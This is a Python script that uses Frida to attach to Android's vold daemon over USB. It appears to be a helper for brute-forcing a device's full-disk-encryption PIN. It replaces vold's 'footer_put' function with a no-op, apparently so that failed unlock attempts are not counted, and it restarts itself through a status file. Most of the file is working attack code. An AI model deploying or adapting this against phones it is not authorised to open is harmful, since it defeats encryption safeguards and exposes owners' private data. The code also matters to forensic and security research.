#!/usr/bin/env python

# Modified code from https://github.com/Magpol/fridafde
# Credits to Magpol 
#
# Author: Arcain
#
# Added:
#   * custom PIN range
#   * auto-restart option after x amounts of tests
#     (S7 Edge gets stuck after ~12000 tests)
#     user -r param to enable this option, followed
#     by a number to customize (ie. -r 5000 to restart 
#     after 5000)
#   * some sort of test for hooking-vold running

import frida
import sys
import time
import os
import time

def main():
    procname = "vold"

    voldScript = """
    var startTime = Date.now();
    var currentApplication = "vold";
    var targetFunction = "footer_put";

    var baseAddr = Module.findBaseAddress(currentApplication);
    var processAddr = Module.findExportByName(currentApplication, targetFunction); 

    send(":: Intercepting - "+ currentApplication +" @ "+ baseAddr +"::");
    send(":: Replacing function - "+ targetFunction +" @ "+ processAddr +"::");

    Interceptor.replace(processAddr,  new NativeCallback(function() {send(":: " + Date(startTime).toString() + " - Replacing :: VOLD :: put_footer -")}, 'void', []));
    """

    print(":: Starting..")
    print(":: Attaching to process:" + procname)

    def print_result(message):
                print(":: Running %s" %(message))

    def on_message(message, data):
                print_result(message['payload'])

    device = frida.get_usb_device()
    session = device.attach(procname) 

    script = session.create_script(voldScript)

    script.on('message', on_message)
    script.load()
    os.system("echo -n 9 > bf_status")

    while True:
        with open("bf_status","r") as f:
            data = f.read()
            if ("2" in data):
                print("> Restarting the script in 20 seconds")
                #script.unload()
                time.sleep(20)
                main()
        time.sleep(0.5)

    sys.stdin.read()

if __name__ == "__main__":
    main()